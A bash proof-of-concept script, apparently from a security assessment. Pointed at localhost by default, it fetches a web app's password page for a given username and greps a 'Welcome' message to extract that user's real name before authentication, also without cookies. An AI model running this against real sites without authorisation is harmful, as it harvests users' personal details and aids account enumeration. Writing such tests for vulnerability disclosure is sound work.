#!/bin/bash

# POC: Real Name Exposure in Password Page
# Demonstrates information disclosure vulnerability where user's real name
# is exposed in the password authentication page before full authentication

TARGET_URL="${1:-http://localhost:8080}"
USERNAME="test"

echo "[*] Real Name Disclosure POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Get the password form for a valid user
echo "[+] Step 1: Fetching password form for username: $USERNAME"
PASSWORD_PAGE=$(curl -s "$TARGET_URL/password/$USERNAME")

# Step 2: Extract the welcome message containing the real name
echo "[+] Step 2: Checking for real name in password page response..."
echo ""

# Look for the welcome message with the name
WELCOME_MESSAGE=$(echo "$PASSWORD_PAGE" | grep -oP 'Welcome, [^<]*!' | head -1)
if [ -n "$WELCOME_MESSAGE" ]; then
    echo "[!] VULNERABLE: Real name exposed in password page"
    echo "[!] Found message: $WELCOME_MESSAGE"
    echo ""
fi

# Extract the full name if available
FULL_NAME=$(echo "$PASSWORD_PAGE" | grep -oP 'Welcome, [^!]*' | sed 's/Welcome, //' | head -1)
if [ -n "$FULL_NAME" ]; then
    echo "[!] Extracted user real name: $FULL_NAME"
    echo ""
fi

# Step 3: Show the vulnerable HTML snippet
echo "[+] Step 3: Vulnerable HTML snippet from response:"
echo "$PASSWORD_PAGE" | grep -A 1 -B 1 'Welcome' | head -5
echo ""

# Step 4: Verify this is before authentication
echo "[+] Step 4: Verification that this information is disclosed BEFORE password entry:"
if echo "$PASSWORD_PAGE" | grep -q 'type="password"'; then
    echo "[!] Password form is present on the same page as the real name disclosure"
    echo "[!] This means the real name is shown BEFORE authentication completes"
    echo ""
fi

# Step 5: Demonstrate that the name is not just from session
echo "[+] Step 5: Testing with unauthenticated request (no cookies):"
UNAUTHENTICATED=$(curl -s -b "" "$TARGET_URL/password/$USERNAME" | grep -oP 'Welcome, [^<]*')
if echo "$UNAUTHENTICATED" | grep -q "Welcome"; then
    echo "[!] Real name is disclosed even without authentication cookies"
    echo "[!] Exposed: $UNAUTHENTICATED"
    echo ""
fi

echo "[+] POC Complete: Real name information disclosure confirmed"